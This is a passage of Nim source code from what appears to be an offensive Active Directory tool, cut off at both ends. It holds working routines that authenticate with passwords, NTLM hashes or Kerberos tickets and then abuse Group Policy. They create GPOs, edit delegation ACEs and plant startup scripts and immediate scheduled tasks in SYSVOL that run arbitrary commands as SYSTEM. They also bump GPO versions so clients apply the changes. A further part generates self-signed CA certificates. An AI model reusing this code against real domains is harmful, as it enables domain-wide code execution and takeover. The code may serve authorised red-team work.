    if r.success:
      var rollbackCmd = newJArray()
      for part in ["ldap", "<dc>", "--gpo", "--delegate"]:
        rollbackCmd.add %part
      if addAce:
        rollbackCmd.add %"--remove-ace"
      for part in ["--name", gpo, "--principal", config.ldapAclPrincipal,
          "--rights", spec.rights.join(",")]:
        rollbackCmd.add %part
      appendRollbackRecord(config, %*{
        "operation": "gpo-delegate",
        "rollback_operation": if addAce: "gpo-delegate-remove" else: "gpo-delegate-add",
        "gpo": gpo,
        "gpo_dn": info.dn,
        "principal": config.ldapAclPrincipal,
        "rights": spec.rights,
        "command": rollbackCmd
      })
  return %*{"protocol": "ldap", "operation": "gpo-delegate",
    "host": host, "port": config.port, "authenticated": true,
    "success": ok, "gpo": gpo, "gpo_dn": info.dn,
    "display_name": info.displayName, "principal": config.ldapAclPrincipal,
    "mode": if addAce: "add" else: "remove", "items": items,
    "message": if ok: "GPO delegation updated" else: "GPO delegation update failed"}

proc remoteParentDir(path: string): string =
  let normalized = path.replace('/', '\\').strip(chars = {'\\', '/'})
  let pos = normalized.rfind('\\')
  if pos < 0: ""
  else: normalized[0 ..< pos]

proc genGpoGuid(): string =
  randomize()
  var b: array[16, uint8]
  for i in 0 ..< 16: b[i] = uint8(rand(255))
  b[6] = (b[6] and 0x0f'u8) or 0x40'u8
  b[8] = (b[8] and 0x3f'u8) or 0x80'u8
  result = "{" &
    b[0].toHex(2) & b[1].toHex(2) & b[2].toHex(2) & b[3].toHex(2) & "-" &
    b[4].toHex(2) & b[5].toHex(2) & "-" &
    b[6].toHex(2) & b[7].toHex(2) & "-" &
    b[8].toHex(2) & b[9].toHex(2) & "-" &
    b[10].toHex(2) & b[11].toHex(2) & b[12].toHex(2) & b[13].toHex(2) & b[14].toHex(2) & b[15].toHex(2) & "}"
  result = result.toUpperAscii()

proc putStringOnTree(session: smbclient.SmbSession; treeId: uint32; share, remotePath,
                     content: string): Future[smbtransfer.SmbTransferResult] {.async.} =
  let tmp = getTempDir() / ("nimux-tmp-" & $getCurrentProcessId() & ".dat")
  writeFile(tmp, content)
  result = await smbtransfer.putFileOnTree(session, treeId, share, remotePath, tmp)
  try: removeFile(tmp)
  except CatchableError: discard

proc gpoCreateJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  try:
    let displayName = config.ldapName
    if displayName.len == 0:
      return %*{"protocol": "ldap", "operation": "gpo-create", "host": host,
        "success": false, "message": "--gpo --create requires --name <displayName>"}
    if config.dryRun:
      let guid = genGpoGuid()
      return %*{"protocol": "ldap", "operation": "gpo-create", "host": host,
        "success": true, "dry_run": true, "display_name": displayName,
        "planned_guid": guid,
        "planned_sysvol_suffix": "Policies\\" & guid,
        "planned": %*[
          {"kind": "ldap-add", "objectClass": "groupPolicyContainer", "displayName": displayName},
          {"kind": "sysvol-mkdir", "path": "Policies\\" & guid},
          {"kind": "sysvol-put", "path": "Policies\\" & guid & "\\GPT.INI"}
        ],
        "message": "dry-run only; no LDAP or SMB writes sent"}
    let credential = smbclient.SmbCredential(username: config.username,
      password: config.password, ntlmHash: config.ntlmHash, domain: config.domain,
      ccache: config.ccachePath, krb5Config: config.krb5ConfigPath)
    let probe = await ldapclient.probeLdap(host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.domain, config.ntlmHash,
      ldapclient.LdapQueryOptions(rootDse: true), kerberos=config.kerberos)
    if not probe.authenticated:
      return %*{"protocol": "ldap", "operation": "gpo-create", "host": host,
        "success": false, "authenticated": false, "message": probe.bindDiagnostic}
    let baseDn = probe.defaultNamingContext
    let dnsDomain = baseDnToDnsName(baseDn)
    let guid = genGpoGuid()
    let dn = "CN=" & guid & ",CN=Policies,CN=System," & baseDn
    let fileSysPath = "\\\\" & dnsDomain & "\\SysVol\\" & dnsDomain & "\\Policies\\" & guid
    let attrs: seq[tuple[name: string, values: seq[string]]] = @[
      ("objectClass", @["top", "container", "groupPolicyContainer"]),
      ("cn", @[guid]),
      ("distinguishedName", @[dn]),
      ("displayName", @[displayName]),
      ("gPCFileSysPath", @[fileSysPath]),
      ("flags", @["0"]),
      ("versionNumber", @["0"]),
      ("gPCFunctionalityVersion", @["2"]),
    ]
    let writeResult = await ldapclient.applyLdapActions(
      host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain,
      @[ldapclient.LdapWriteAction(kind: ldapclient.lwAdd, dn: dn, attrs: attrs)],
      kerberos=config.kerberos)
    if not writeResult.success:
      return %*{"protocol": "ldap", "operation": "gpo-create", "host": host,
        "success": false, "guid": guid, "dn": dn,
        "message": "LDAP create failed: " & writeResult.message}
    let session = await smbclient.establishSmbSession(host, 445,
      max(config.timeoutMs, 10000), credential,
      if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm)
    if session == nil or not session.authenticated:
      return %*{"protocol": "ldap", "operation": "gpo-create", "host": host,
        "success": false, "guid": guid, "dn": dn, "ldap_created": true,
        "message": if session == nil: "SMB session failed" else: session.message}
    let share = if config.shareName.len > 0: config.shareName else: "SYSVOL"
    let treeId = await smbclient.connectShareTree(session, share)
    if treeId == 0:
      return %*{"protocol": "ldap", "operation": "gpo-create", "host": host,
        "success": false, "guid": guid, "dn": dn, "ldap_created": true,
        "message": "could not mount \\\\" & host & "\\" & share}
    let sysvolBase = dnsDomain & "\\Policies\\" & guid
    discard await smbtransfer.ensureRemoteDirOnTree(session, treeId, sysvolBase)
    discard await smbtransfer.ensureRemoteDirOnTree(session, treeId, sysvolBase & "\\Machine")
    discard await smbtransfer.ensureRemoteDirOnTree(session, treeId, sysvolBase & "\\User")
    let gptContent = "[General]\r\nVersion=0\r\ndisplayName=" & displayName & "\r\n"
    let gptPath = sysvolBase & "\\GPT.INI"
    let put = await putStringOnTree(session, treeId, share, gptPath, gptContent)
    return %*{"protocol": "ldap", "operation": "gpo-create", "host": host,
      "success": put.success, "authenticated": true, "guid": guid, "dn": dn,
      "display_name": displayName, "sysvol": fileSysPath, "gpt_ini_written": put.success,
      "message": if put.success: "GPO created" else: put.message}
  except CatchableError as error:
    return %*{"protocol": "ldap", "operation": "gpo-create", "host": host,
      "success": false, "message": error.msg}

proc joinRemotePath(basePath, childPath: string): string =
  let left = basePath.replace('/', '\\').strip(chars = {'\\', '/'})
  let right = childPath.replace('/', '\\').strip(chars = {'\\', '/'})
  if left.len == 0: right
  elif right.len == 0: left
  else: left & "\\" & right

proc nextGpoVersion(current: int; remotePath: string): int =
  let p = remotePath.replace('\\', '/').toLowerAscii()
  let user = (current shr 16) and 0xffff
  let machine = current and 0xffff
  if p.startsWith("user/"):
    ((user + 1) shl 16) or machine
  else:
    (user shl 16) or (machine + 1)

proc gptIniWithVersion(contents: string; version: int): string =
  var lines = contents.splitLines()
  var sawGeneral = false
  var sawVersion = false
  for i in 0 ..< lines.len:
    if lines[i].strip().cmpIgnoreCase("[General]") == 0:
      sawGeneral = true
    if lines[i].strip().toLowerAscii().startsWith("version="):
      lines[i] = "Version=" & $version
      sawVersion = true
  if not sawGeneral:
    lines.insert("[General]", 0)
  if not sawVersion:
    if lines.len == 0:
      lines.add "[General]"
    lines.add "Version=" & $version
  result = lines.join("\r\n") & "\r\n"

proc bumpGpoVersion(host: string; config: CliConfig; info: ldapclient.LdapGpoInfoResult;
                    session: smbclient.SmbSession; treeId: uint32; share, basePath,
                    changedRemote: string): Future[JsonNode] {.async.} =
  let nextVersion = nextGpoVersion(info.versionNumber, changedRemote)
  let gptRemote = joinRemotePath(basePath, "GPT.INI")
  let tmpIn = getTempDir() / ("nimux-gpt-" & $getCurrentProcessId() & ".ini")
  let tmpOut = getTempDir() / ("nimux-gpt-" & $getCurrentProcessId() & "-out.ini")
  var existing = ""
  let get = await smbtransfer.getFileOnTree(session, treeId, share, gptRemote, tmpIn)
  if get.success:
    try: existing = readFile(tmpIn)
    except CatchableError: existing = ""
  writeFile(tmpOut, gptIniWithVersion(existing, nextVersion))
  let put = await smbtransfer.putFileOnTree(session, treeId, share, gptRemote, tmpOut)
  try: removeFile(tmpIn)
  except CatchableError: discard
  try: removeFile(tmpOut)
  except CatchableError: discard
  var ldapOk = false
  var ldapMessage = ""
  if put.success:
    let wr = await ldapclient.modifyGpoObject(host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain, info.dn,
      @[ldapclient.LdapModification(op: ldapclient.lmoReplace,
        attr: "versionNumber", values: @[$nextVersion])],
      kerberos=config.kerberos)
    ldapOk = wr.success
    ldapMessage = wr.message
  return %*{"old_version": info.versionNumber, "new_version": nextVersion,
    "gpt_ini": gptRemote, "gpt_ini_written": put.success,
    "ldap_version_written": ldapOk, "message": if put.success: ldapMessage else: put.message}

proc gpoStartupScriptJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  try:
    let gpo = if config.ldapName.len > 0: config.ldapName else: config.ldapModifyDn
    let localScript = config.ldapGpoPut
    if gpo.len == 0:
      return %*{"protocol": "ldap", "operation": "gpo-startup", "host": host,
        "success": false, "message": "--gpo --startup requires --name <gpo>"}
    if localScript.len == 0:
      return %*{"protocol": "ldap", "operation": "gpo-startup", "host": host,
        "success": false, "message": "--gpo --startup requires --put <script>"}
    if not fileExists(localScript):
      return %*{"protocol": "ldap", "operation": "gpo-startup", "host": host,
        "success": false, "message": "local file not found: " & localScript}
    if config.dryRun:
      let scriptName = localScript.extractFilename()
      return %*{"protocol": "ldap", "operation": "gpo-startup", "host": host,
        "success": true, "dry_run": true, "gpo": gpo,
        "script": scriptName, "local_path": localScript,
        "script_remote": "Machine\\Scripts\\Startup\\" & scriptName,
        "scripts_ini": "Machine\\Scripts\\scripts.ini",
        "params": config.ldapGpoScriptParams,
        "version_bump": not config.ldapGpoNoBump,
        "message": "dry-run only; no SMB or LDAP writes sent"}
    let info = await ldapclient.gpoInfo(host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain, gpo,
      kerberos=config.kerberos)
    if not info.success:
      return %*{"protocol": "ldap", "operation": "gpo-startup", "host": host,
        "success": false, "authenticated": info.authenticated, "message": info.message}
    let unc = smbtransfer.splitUnc(info.gpcFileSysPath)
    let share = if config.shareName.len > 0: config.shareName else: unc.share
    let credential = smbclient.SmbCredential(username: config.username,
      password: config.password, ntlmHash: config.ntlmHash, domain: config.domain,
      ccache: config.ccachePath, krb5Config: config.krb5ConfigPath)
    let session = await smbclient.establishSmbSession(host, 445,
      max(config.timeoutMs, 10000), credential,
      if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm)
    if session == nil or not session.authenticated:
      return %*{"protocol": "ldap", "operation": "gpo-startup", "host": host,
        "success": false, "gpo": gpo,
        "message": if session == nil: "SMB session failed" else: session.message}
    let treeId = await smbclient.connectShareTree(session, share)
    if treeId == 0:
      return %*{"protocol": "ldap", "operation": "gpo-startup", "host": host,
        "success": false, "gpo": gpo,
        "message": "could not mount \\\\" & host & "\\" & share}
    let scriptName = localScript.extractFilename()
    let scriptsBase = joinRemotePath(unc.path, "Machine\\Scripts")
    let startupDir = joinRemotePath(scriptsBase, "Startup")
    discard await smbtransfer.ensureRemoteDirOnTree(session, treeId, scriptsBase)
    discard await smbtransfer.ensureRemoteDirOnTree(session, treeId, startupDir)
    let scriptRemote = joinRemotePath(startupDir, scriptName)
    let putScript = await smbtransfer.putFileOnTree(session, treeId, share, scriptRemote, localScript)
    if not putScript.success:
      return %*{"protocol": "ldap", "operation": "gpo-startup", "host": host,
        "success": false, "gpo": gpo, "message": "script upload failed: " & putScript.message}
    let params = config.ldapGpoScriptParams
    let iniContent = "[Startup]\r\n0CmdLine=" & scriptName & "\r\n0Parameters=" & params & "\r\n"
    let iniRemote = joinRemotePath(scriptsBase, "scripts.ini")
    let putIni = await putStringOnTree(session, treeId, share, iniRemote, iniContent)
    let bump =
      if not config.ldapGpoNoBump:
        await bumpGpoVersion(host, config, info, session, treeId, share, unc.path,
          "Machine\\Scripts\\Startup\\" & scriptName)
      else:
        %*{"skipped": true}
    return %*{"protocol": "ldap", "operation": "gpo-startup", "host": host,
      "success": putIni.success, "authenticated": true, "gpo": gpo,
      "gpo_dn": info.dn, "display_name": info.displayName,
      "script": scriptName, "script_remote": scriptRemote,
      "scripts_ini_written": putIni.success, "params": params,
      "version_bump": bump,
      "message": if putIni.success: "startup script deployed" else: putIni.message}
  except CatchableError as error:
    return %*{"protocol": "ldap", "operation": "gpo-startup", "host": host,
      "success": false, "message": error.msg}

proc gpoScheduledTaskJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  try:
    let gpo = if config.ldapName.len > 0: config.ldapName else: config.ldapModifyDn
    let taskName = config.ldapGpoTaskName
    let taskCmd = config.ldapGpoTaskCmd
    if gpo.len == 0 or taskName.len == 0 or taskCmd.len == 0:
      return %*{"protocol": "ldap", "operation": "gpo-schtask", "host": host,
        "success": false,
        "message": "--gpo --schtask requires --name <gpo>, --task-name <n>, --task-cmd <cmd>"}
    let taskArgs = config.ldapGpoTaskArgs
    let taskUser = if config.ldapGpoTaskUser.len > 0: config.ldapGpoTaskUser else: "NT AUTHORITY\\System"
    let taskGuid = genGpoGuid()
    let now = getTime().utc().format("yyyy-MM-dd'T'HH:mm:ss")
    if config.dryRun:
      return %*{"protocol": "ldap", "operation": "gpo-schtask", "host": host,
        "success": true, "dry_run": true, "gpo": gpo,
        "task_name": taskName, "task_cmd": taskCmd, "task_args": taskArgs,
        "task_user": taskUser, "task_guid": taskGuid,
        "xml_remote": "Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
        "version_bump": not config.ldapGpoNoBump,
        "message": "dry-run only; no SMB or LDAP writes sent"}
    let xml = """<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A0CE23105CF7}">
  <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="""" & taskName & """" image="0" changed="""" & now & """" uid="""" & taskGuid & """" userContext="0" removePolicy="0">
    <Properties action="C" name="""" & taskName & """" runAs="""" & taskUser & """" logonType="S4U">
      <Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
        <RegistrationInfo><Author>""" & taskUser & """</Author><Description/></RegistrationInfo>
        <Principals>
          <Principal id="Author">
            <UserId>""" & taskUser & """</UserId>
            <RunLevel>HighestAvailable</RunLevel>
            <LogonType>S4U</LogonType>
          </Principal>
        </Principals>
        <Settings>
          <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
          <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
          <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
          <AllowHardTerminate>false</AllowHardTerminate>
          <StartWhenAvailable>true</StartWhenAvailable>
          <AllowStartOnDemand>true</AllowStartOnDemand>
          <Enabled>true</Enabled>
          <Hidden>false</Hidden>
          <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
          <Priority>7</Priority>
          <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
        </Settings>
        <Triggers>
          <TimeTrigger><StartBoundary>""" & now & """</StartBoundary><Enabled>true</Enabled></TimeTrigger>
        </Triggers>
        <Actions Context="Author">
          <Exec>
            <Command>""" & taskCmd & """</Command>
            <Arguments>""" & taskArgs & """</Arguments>
          </Exec>
        </Actions>
      </Task>
    </Properties>
  </ImmediateTaskV2>
</ScheduledTasks>
"""
    let info = await ldapclient.gpoInfo(host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain, gpo,
      kerberos=config.kerberos)
    if not info.success:
      return %*{"protocol": "ldap", "operation": "gpo-schtask", "host": host,
        "success": false, "authenticated": info.authenticated, "message": info.message}
    let unc = smbtransfer.splitUnc(info.gpcFileSysPath)
    let share = if config.shareName.len > 0: config.shareName else: unc.share
    let credential = smbclient.SmbCredential(username: config.username,
      password: config.password, ntlmHash: config.ntlmHash, domain: config.domain,
      ccache: config.ccachePath, krb5Config: config.krb5ConfigPath)
    let session = await smbclient.establishSmbSession(host, 445,
      max(config.timeoutMs, 10000), credential,
      if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm)
    if session == nil or not session.authenticated:
      return %*{"protocol": "ldap", "operation": "gpo-schtask", "host": host,
        "success": false, "gpo": gpo,
        "message": if session == nil: "SMB session failed" else: session.message}
    let treeId = await smbclient.connectShareTree(session, share)
    if treeId == 0:
      return %*{"protocol": "ldap", "operation": "gpo-schtask", "host": host,
        "success": false, "gpo": gpo,
        "message": "could not mount \\\\" & host & "\\" & share}
    let prefBase = joinRemotePath(unc.path, "Machine\\Preferences")
    let taskDir = joinRemotePath(prefBase, "ScheduledTasks")
    discard await smbtransfer.ensureRemoteDirOnTree(session, treeId, prefBase)
    discard await smbtransfer.ensureRemoteDirOnTree(session, treeId, taskDir)
    let xmlRemote = joinRemotePath(taskDir, "ScheduledTasks.xml")
    let put = await putStringOnTree(session, treeId, share, xmlRemote, xml)
    let bump =
      if put.success and not config.ldapGpoNoBump:
        await bumpGpoVersion(host, config, info, session, treeId, share, unc.path,
          "Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml")
      else:
        %*{"skipped": true}
    return %*{"protocol": "ldap", "operation": "gpo-schtask", "host": host,
      "success": put.success, "authenticated": true, "gpo": gpo,
      "gpo_dn": info.dn, "display_name": info.displayName,
      "task_name": taskName, "task_cmd": taskCmd, "task_args": taskArgs, "task_user": taskUser,
      "task_guid": taskGuid, "xml_remote": xmlRemote, "version_bump": bump,
      "message": if put.success: "scheduled task deployed" else: put.message}
  except CatchableError as error:
    return %*{"protocol": "ldap", "operation": "gpo-schtask", "host": host,
      "success": false, "message": error.msg}

proc gpoSysvolPutJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  try:
    let gpo = if config.ldapName.len > 0: config.ldapName else: config.ldapModifyDn
    if gpo.len == 0 or config.ldapGpoPut.len == 0 or config.remotePath.len == 0:
      return %*{"protocol": "ldap", "operation": "gpo-put", "host": host,
        "success": false, "message": "--gpo --put requires --name, --put <local>, and --remote <path>"}
    if not fileExists(config.ldapGpoPut):
      return %*{"protocol": "ldap", "operation": "gpo-put", "host": host,
        "success": false, "local_path": config.ldapGpoPut,
        "message": "local file not found: " & config.ldapGpoPut}
    if config.dryRun:
      return %*{"protocol": "ldap", "operation": "gpo-put", "host": host,
        "success": true, "dry_run": true, "gpo": gpo,
        "remote_path": config.remotePath, "local_path": config.ldapGpoPut,
        "version_bump": not config.ldapGpoNoBump,
        "message": "dry-run only; no SMB or LDAP writes sent"}
    let info = await ldapclient.gpoInfo(host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain, gpo,
      kerberos=config.kerberos)
    if not info.success:
      return %*{"protocol": "ldap", "operation": "gpo-put", "host": host,
        "port": config.port, "success": false, "authenticated": info.authenticated,
        "message": info.message}
    let unc = smbtransfer.splitUnc(info.gpcFileSysPath)
    let share = if config.shareName.len > 0: config.shareName else: unc.share
    let remote = joinRemotePath(unc.path, config.remotePath)
    let credential = smbclient.SmbCredential(username: config.username,
      password: config.password, ntlmHash: config.ntlmHash, domain: config.domain,
      ccache: config.ccachePath, krb5Config: config.krb5ConfigPath)
    let session = await smbclient.establishSmbSession(host, 445,
      max(config.timeoutMs, 5000), credential,
      if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm)
    if session == nil or not session.authenticated:
      return %*{"protocol": "ldap", "operation": "gpo-put", "host": host,
        "success": false, "gpo": gpo, "gpo_dn": info.dn,
        "sysvol": info.gpcFileSysPath,
        "message": if session == nil: "SMB session failed" else: session.message}
    let treeId = await smbclient.connectShareTree(session, share)
    if treeId == 0:
      return %*{"protocol": "ldap", "operation": "gpo-put", "host": host,
        "success": false, "gpo": gpo, "gpo_dn": info.dn,
        "sysvol": info.gpcFileSysPath, "share": share,
        "message": "could not mount share \\\\" & host & "\\" & share}
    let parent = remoteParentDir(remote)
    if parent.len > 0:
      discard await smbtransfer.ensureRemoteDirOnTree(session, treeId, parent)
    let put = await smbtransfer.putFileOnTree(session, treeId, share, remote,
      config.ldapGpoPut)
    let bump =
      if put.success and not config.ldapGpoNoBump:
        await bumpGpoVersion(host, config, info, session, treeId, share, unc.path, config.remotePath)
      else:
        %*{"skipped": true}
    return %*{"protocol": "ldap", "operation": "gpo-put", "host": host,
      "success": put.success, "authenticated": put.authenticated,
      "gpo": gpo, "gpo_dn": info.dn, "display_name": info.displayName,
      "sysvol": info.gpcFileSysPath, "share": share,
      "remote_path": remote, "local_path": config.ldapGpoPut,
      "bytes": put.bytes, "message": if put.success: "GPO SYSVOL file uploaded" else: put.message,
      "version_bump": bump, "error": put.error}
  except CatchableError as error:
    return %*{"protocol": "ldap", "operation": "gpo-put", "host": host,
      "success": false, "message": error.msg}

proc gpoSysvolManageJson(host: string; config: CliConfig; operation, remoteArg: string): Future[JsonNode] {.async.} =
  try:
    let gpo = if config.ldapName.len > 0: config.ldapName else: config.ldapModifyDn
    if gpo.len == 0:
      return %*{"protocol": "ldap", "operation": operation, "host": host,
        "success": false, "message": "--gpo " & operation & " requires --name <gpo>"}
    let info = await ldapclient.gpoInfo(host, config.port, max(config.timeoutMs, 5000),
      config.username, config.password, config.ntlmHash, config.domain, gpo,
      kerberos=config.kerberos)
    if not info.success:
      return %*{"protocol": "ldap", "operation": operation, "host": host,
        "success": false, "authenticated": info.authenticated, "message": info.message}
    let unc = smbtransfer.splitUnc(info.gpcFileSysPath)
    let share = if config.shareName.len > 0: config.shareName else: unc.share
    let remote = joinRemotePath(unc.path, remoteArg)
    if config.dryRun and operation == "gpo-delete":
      return %*{"protocol": "ldap", "operation": operation, "host": host,
        "success": true, "dry_run": true, "gpo": gpo, "gpo_dn": info.dn,
        "sysvol": info.gpcFileSysPath, "share": share, "remote_path": remote,
        "version_bump": not config.ldapGpoNoBump,
        "message": "dry-run only; no SMB or LDAP writes sent"}
    let credential = smbclient.SmbCredential(username: config.username,
      password: config.password, ntlmHash: config.ntlmHash, domain: config.domain,
      ccache: config.ccachePath, krb5Config: config.krb5ConfigPath)
    let session = await smbclient.establishSmbSession(host, 445,
      max(config.timeoutMs, 5000), credential,
      if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm)
    if session == nil or not session.authenticated:
      return %*{"protocol": "ldap", "operation": operation, "host": host,
        "success": false, "message": if session == nil: "SMB session failed" else: session.message}
    case operation
    of "gpo-ls":
      let listed = await smbclient.listShareDirectory(session, share, remote)
      var entries = newJArray()
      for e in listed.entries:
        entries.add %*{"name": e.name, "size": e.size, "directory": e.isDirectory,
          "attributes": "0x" & e.attributes.toHex(8)}
      return %*{"protocol": "ldap", "operation": operation, "host": host,
        "success": listed.status == 0, "gpo": gpo, "gpo_dn": info.dn,
        "sysvol": info.gpcFileSysPath, "share": share, "remote_path": remote,
        "entries": entries, "message": listed.message}
    of "gpo-get":
      if config.localPath.len == 0:
        return %*{"protocol": "ldap", "operation": operation, "host": host,
          "success": false, "message": "--gpo --get requires --local <file>"}
      let got = await smbtransfer.getFile(host, 445, max(config.timeoutMs, 5000),
        config.username, config.password, config.ntlmHash, config.domain,
        share, remote, config.localPath, nil,
        if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
        config.ccachePath)
      return %*{"protocol": "ldap", "operation": operation, "host": host,
        "success": got.success, "gpo": gpo, "remote_path": remote,
        "local_path": config.localPath, "bytes": got.bytes, "message": got.message,
        "error": got.error}
    of "gpo-delete":
      let treeId = await smbclient.connectShareTree(session, share)
      if treeId == 0:
        return %*{"protocol": "ldap", "operation": operation, "host": host,
          "success": false, "message": "could not mount share \\\\" & host & "\\" & share}
      let del = await smbtransfer.deleteFileOnTree(session, treeId, share, remote)
      let bump =
        if del.success and not config.ldapGpoNoBump:
          await bumpGpoVersion(host, config, info, session, treeId, share, unc.path, remoteArg)
        else:
          %*{"skipped": true}
      return %*{"protocol": "ldap", "operation": operation, "host": host,
        "success": del.success, "gpo": gpo, "remote_path": remote,
        "message": del.message, "version_bump": bump}
    else:
      return %*{"protocol": "ldap", "operation": operation, "host": host,
        "success": false, "message": "unknown GPO operation"}
  except CatchableError as error:
    return %*{"protocol": "ldap", "operation": operation, "host": host,
      "success": false, "message": error.msg}

type
  DerReader = object
    data: string
    pos: int

proc derReadByte(r: var DerReader): int =
  if r.pos >= r.data.len: return -1
  result = ord(r.data[r.pos])
  inc r.pos

proc derReadLen(r: var DerReader): int =
  let first = r.derReadByte()
  if first < 0: return -1
  if (first and 0x80) == 0: return first
  let count = first and 0x7f
  if count == 0 or count > 4: return -1
  result = 0
  for _ in 0 ..< count:
    let b = r.derReadByte()
    if b < 0: return -1
    result = (result shl 8) or b

proc derReadTlv(r: var DerReader): tuple[tag: int, body: string] =
  let tag = r.derReadByte()
  if tag < 0: return (-1, "")
  let length = r.derReadLen()
  if length < 0 or r.pos + length > r.data.len: return (-1, "")
  result = (tag, r.data[r.pos ..< r.pos + length])
  r.pos += length

proc pemToDer(path: string): string =
  let content = readFile(path)
  if "-----BEGIN" notin content:
    return content
  var inside = false
  var b64 = ""
  for line in content.splitLines():
    if line.startsWith("-----BEGIN ") and "CERTIFICATE" in line:
      inside = true
      continue
    if line.startsWith("-----END ") and inside:
      break
    if inside:
      b64.add line.strip()
  if b64.len == 0:
    raise newException(ValueError, "no PEM certificate found in " & path)
  base64.decode(b64)

proc trimDerInteger(value: string): string =
  result = value
  while result.len > 1 and result[0] == '\0':
    result = result[1 .. ^1]

proc rsaPublicFromCertDer(der: string): tuple[modulus, exponent: string] =
  var cert = DerReader(data: der)
  let certSeq = cert.derReadTlv()
  if certSeq.tag != 0x30:
    raise newException(ValueError, "certificate is not a DER sequence")
  var certInner = DerReader(data: certSeq.body)
  let tbs = certInner.derReadTlv()
  if tbs.tag != 0x30:
    raise newException(ValueError, "certificate TBSCertificate missing")
  var r = DerReader(data: tbs.body)
  var first = r.derReadTlv()
  if first.tag != 0xa0:
    discard
  else:
    first = r.derReadTlv()
  discard r.derReadTlv()
  discard r.derReadTlv()
  discard r.derReadTlv()
  discard r.derReadTlv()
  let spki = r.derReadTlv()
  if spki.tag != 0x30:
    raise newException(ValueError, "certificate SubjectPublicKeyInfo missing")
  var spkiReader = DerReader(data: spki.body)
  discard spkiReader.derReadTlv()
  let bitString = spkiReader.derReadTlv()
  if bitString.tag != 0x03 or bitString.body.len < 2:
    raise newException(ValueError, "certificate public key bit string missing")
  if bitString.body[0] != '\0':
    raise newException(ValueError, "unsupported certificate public key bit padding")
  var keyReader = DerReader(data: bitString.body[1 .. ^1])
  let keySeq = keyReader.derReadTlv()
  if keySeq.tag != 0x30:
    raise newException(ValueError, "certificate public key is not RSA")
  var rsa = DerReader(data: keySeq.body)
  let n = rsa.derReadTlv()
  let e = rsa.derReadTlv()
  if n.tag != 0x02 or e.tag != 0x02:
    raise newException(ValueError, "RSA modulus/exponent missing")
  result.modulus = trimDerInteger(n.body)
  result.exponent = trimDerInteger(e.body)


proc generateSelfSignedCert(cn: string; upn = ""): tuple[certPem, keyPem, caCertPem: string] =
  let pkey = EVP_RSA_gen(2048)
  if pkey == nil:
    raise newException(OSError, "RSA key generation failed")
  defer: EVP_PKEY_free(pkey)
  let x509 = X509_new()
  if x509 == nil:
    raise newException(OSError, "X509_new failed")
  defer: X509_free(x509)
  discard X509_set_version(x509, 2)
  discard ASN1_INTEGER_set(X509_get_serialNumber(x509), 1)
  discard X509_gmtime_adj(X509_get_notBefore(x509), -24 * 3600)
  discard X509_gmtime_adj(X509_get_notAfter(x509), 365 * 24 * 3600 * 10)
  discard X509_set_pubkey(x509, pkey)
  let name = X509_get_subject_name(x509)
  let cnBytes = cn.cstring
  discard X509_NAME_add_entry_by_txt(name, "CN", 0x1000,
    cast[pointer](cnBytes), cn.len.cint, -1, 0)
  discard X509_set_issuer_name(x509, name)
  var v3ctx: X509v3Ctx
  X509V3_set_ctx_nodb(addr v3ctx)
  X509V3_set_ctx(addr v3ctx, x509, x509, nil, nil, 0)
  let bcExt = X509V3_EXT_conf_nid(nil, addr v3ctx, NID_basic_constraints,
    "critical,CA:TRUE")
  if bcExt != nil:
    discard X509_add_ext(x509, bcExt, -1)
    X509_EXTENSION_free(bcExt)
  discard X509_sign(x509, pkey, EVP_sha256())

  let certBio = BIO_new(BIO_s_mem())
  defer: discard BIO_free(certBio)
  discard PEM_write_bio_X509(certBio, x509)
  result.certPem = bioToString(certBio)
  let keyBio = BIO_new(BIO_s_mem())
  defer: discard BIO_free(keyBio)
  discard PEM_write_bio_PrivateKey(keyBio, pkey, nil, nil, 0, nil, nil)
  result.keyPem = bioToString(keyBio)
  let caBio = BIO_new(BIO_s_mem())
  defer: discard BIO_free(caBio)
  discard PEM_write_bio_X509(caBio, x509)
  result.caCertPem = bioToString(caBio)

proc addU16LeLocal(data: var string; value: uint16) =
  data.add char(value and 0xff)
  data.add char((value shr 8) and 0xff)

proc addU32LeLocal(data: var string; value: uint32) =
  for shift in countup(0, 24, 8):
    data.add char((value shr shift) and 0xff)

proc addU64LeLocal(data: var string; value: uint64) =
  for shift in countup(0, 56, 8):
    data.add char((value shr shift) and 0xff)

proc binaryHex(data: string): string =
  const Hex = "0123456789abcdef"
  for c in data:
    result.add Hex[(ord(c) shr 4) and 0xf]
    result.add Hex[ord(c) and 0xf]

proc readU16LeLocal(data: string; offset: int): uint16 =
  if offset + 1 >= data.len: return 0
  uint16(ord(data[offset])) or (uint16(ord(data[offset + 1])) shl 8)

proc readU32LeLocal(data: string; offset: int): uint32 =
  if offset + 3 >= data.len: return 0
  uint32(ord(data[offset])) or
    (uint32(ord(data[offset + 1])) shl 8) or
    (uint32(ord(data[offset + 2])) shl 16) or
    (uint32(ord(data[offset + 3])) shl 24)

proc addU32BeLocal(data: var string; value: uint32) =
  for shift in countdown(24, 0, 8):
